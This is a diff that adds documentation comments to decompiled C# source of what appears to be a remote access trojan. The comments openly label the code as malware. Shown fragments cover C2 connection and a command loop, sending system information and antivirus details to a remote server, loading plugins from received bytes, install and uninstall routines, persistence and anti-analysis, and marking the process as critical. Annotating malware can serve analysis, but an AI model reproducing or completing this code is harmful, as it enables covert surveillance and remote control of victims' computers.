@@ -140,13 +140,31 @@ namespace j
     }
 
     [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    
+
+/**
+ * @brief Retrieves information about a camera driver
+ * 
+ * @param wDriver The index of the camera driver to query
+ * @param lpszName Buffer to receive the driver name
+ * @param cbName Size of the name buffer
+ * @param lpszVer Buffer to receive the driver version
+ * @param cbVer Size of the version buffer
+ * @return true if successful, false otherwise
+ */
     public static extern bool capGetDriverDescriptionA(
       short wDriver,
       [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
       int cbName,
       [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
       int cbVer);
-
+/**
+ * @brief Compares the directories of two FileInfo objects
+ * 
+ * @param F1 First FileInfo object
+ * @param F2 Second FileInfo object
+ * @return true if both files are in the same directory tree, false otherwise
+ */
     private static bool CompDir(FileInfo F1, FileInfo F2)
     {
       if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
@@ -164,7 +182,11 @@ namespace j
       }
       return false;
     }
-
+/**
+ * @brief Establishes a connection to the remote server
+ * 
+ * @return true if connection was successfully established, false otherwise
+ */
     public static bool connect()
     {
       OK.Cn = false;
@@ -255,13 +277,22 @@ namespace j
       }
       return OK.Cn;
     }
-
+/**
+ * @brief Decodes a Base64 encoded string
+ * 
+ * @param s Reference to the Base64 encoded string
+ * @return Decoded string
+ */
     public static string DEB(ref string s)
     {
       byte[] B = Convert.FromBase64String(s);
       return OK.BS(ref B);
     }
-
+/**
+ * @brief Deletes a registry value from the current user's registry
+ * 
+ * @param n Name of the registry value to delete
+ */
     public static void DLV(string n)
     {
       try
@@ -276,14 +307,37 @@ namespace j
         ProjectData.ClearProjectError();
       }
     }
-
+/**
+ * @brief Calls the process manipulation method with parameter 0
+ */
     public static void ED() => OK.pr(0);
-
+/**
+ * @brief Encodes a string in Base64
+ * 
+ * @param s Reference to the string to encode
+ * @return Base64 encoded string
+ */
     public static string ENB(ref string s) => Convert.ToBase64String(OK.SB(ref s));
-
+/**
+ * @brief Gets a handle to the currently active window
+ * 
+ * @return Handle to the foreground window
+ */
     [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
     public static extern IntPtr GetForegroundWindow();
-
+/**
+ * @brief Retrieves information about the file system and volume
+ * 
+ * @param lpRootPathName Root path of the volume
+ * @param lpVolumeNameBuffer Buffer to receive the volume name
+ * @param nVolumeNameSize Size of the volume name buffer
+ * @param lpVolumeSerialNumber Pointer to receive the volume serial number
+ * @param lpMaximumComponentLength Pointer to receive the maximum component length
+ * @param lpFileSystemFlags Pointer to receive the file system flags
+ * @param lpFileSystemNameBuffer Buffer to receive the file system name
+ * @param nFileSystemNameSize Size of the file system name buffer
+ * @return Nonzero on success, zero on failure
+ */
     [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
     private static extern int GetVolumeInformation(
       [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
@@ -294,10 +348,22 @@ namespace j
       ref int lpFileSystemFlags,
       [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
       int nFileSystemNameSize);
-
+/**
+ * @brief Gets the text of the specified window
+ * 
+ * @param hWnd Handle to the window
+ * @param WinTitle Buffer to receive the window text
+ * @param MaxLength Maximum number of characters to copy
+ * @return The number of characters copied
+ */
     [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
     public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);
 
+/**
+ * @brief Retrieves the name of the installed antivirus product
+ * 
+ * @return Name of the antivirus product, or "No AV" if none found
+ */
     public static string GetAntiVirus()
     {
       string antiVirus;
@@ -389,7 +455,13 @@ label_22:
 
     [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
     public static extern int GetWindowTextLength(long hwnd);
-
+/**
+ * @brief Gets a value from the registry or returns the default if not found
+ * 
+ * @param n Registry value name
+ * @param ret Default value to return if the registry value is not found
+ * @return Registry value or default value
+ */
     public static object GTV(string n, object ret)
     {
       object objectValue;
@@ -407,7 +479,11 @@ label_22:
       }
       return objectValue;
     }
-
+/**
+ * @brief Gets the hardware ID (volume serial number)
+ * 
+ * @return Volume serial number as a hex string, or "ERR" on failure
+ */
     public static string HWD()
     {
       string str;
@@ -432,7 +508,11 @@ label_22:
       }
       return str;
     }
-
+/**
+ * @brief Handles incoming data from the remote server
+ * 
+ * @param b Byte array containing the received data
+ */
     [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
     public static void Ind(byte[] b)
     {
@@ -806,6 +886,11 @@ label_22:
       }
     }
 
+/**
+ * @brief Builds system information data to be sent to the server
+ * 
+ * @return Formatted string containing system information
+ */
     public static string inf()
     {
       string str1 = "ll" + OK.Y;
@@ -954,6 +1039,9 @@ label_22:
       return str19 + str20;
     }
 
+/**
+ * @brief Installs the malware on the system
+ */
     [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
     public static void INS()
     {
@@ -1044,7 +1132,9 @@ label_22:
         ProjectData.ClearProjectError();
       }
     }
-
+/**
+ * @brief Initializes malware operations including persistence, anti-analysis, and command loop
+ */
     [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
     public static void ko()
     {
@@ -1197,6 +1287,12 @@ label_22:
       }
     }
 
+/**
+ * @brief Calculates the MD5 hash of a byte array
+ * 
+ * @param B Byte array to hash
+ * @return MD5 hash as a hexadecimal string
+ */
     public static string md5(byte[] B)
     {
       B = new MD5CryptoServiceProvider().ComputeHash(B);
@@ -1219,6 +1315,13 @@ label_22:
       ref int processInformation,
       int processInformationLength);
 
+/**
+ * @brief Loads a plugin from a byte array
+ * 
+ * @param b Byte array containing the plugin assembly
+ * @param c Class identifier to instantiate
+ * @return Instance of the plugin class or null if not found
+ */
     public static object Plugin(byte[] b, string c)
     {
       Module[] modules = Assembly.Load(b).GetModules();
@@ -1240,6 +1343,11 @@ label_22:
       return (object) null;
     }
 
+/**
+ * @brief Sets process critical status to control termination behavior
+ * 
+ * @param i Value to set (0 for normal, 1 for critical)
+ */
     public static void pr(int i)
     {
       try
@@ -1255,6 +1363,9 @@ label_22:
       }
     }
 
+/**
+ * @brief Maintains connection with C2 server and handles incoming data
+ */
     public static void RC()
     {
       while (true)
@@ -1370,11 +1481,27 @@ label_25:
         OK.Cn = true;
       }
     }
-
+/**
+ * @brief Converts a string to a UTF-8 byte array
+ * 
+ * @param S Reference to the string to convert
+ * @return UTF-8 byte array
+ */
     public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);
-
+/**
+ * @brief Sends a string to the remote server
+ * 
+ * @param S String to send
+ * @return true if sent successfully, false otherwise
+ */
     public static bool Send(string S) => OK.Sendb(OK.SB(ref S));
 
+/**
+ * @brief Sends a byte array to the remote server
+ * 
+ * @param b Byte array to send
+ * @return true if sent successfully, false otherwise
+ */
     public static bool Sendb(byte[] b)
     {
       if (!OK.Cn)
@@ -1417,7 +1544,14 @@ label_25:
       }
       return OK.Cn;
     }
-
+/**
+ * @brief Sets a registry value in the current user's registry
+ * 
+ * @param n Name of the registry value
+ * @param t Value to set
+ * @param typ Registry value type
+ * @return true if successful, false otherwise
+ */
     public static bool STV(string n, object t, RegistryValueKind typ)
     {
       bool flag;
@@ -1436,7 +1570,9 @@ label_25:
       }
       return flag;
     }
-
+/**
+ * @brief Uninstalls the malware from the system
+ */
     [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
     public static void UNS()
     {
@@ -1533,6 +1669,12 @@ label_25:
       ProjectData.EndApp();
     }
 
+/**
+ * @brief Decompresses a byte array using GZip
+ * 
+ * @param B Compressed byte array
+ * @return Decompressed byte array
+ */
     public static byte[] ZIP(byte[] B)
     {
       MemoryStream memoryStream = new MemoryStream(B);
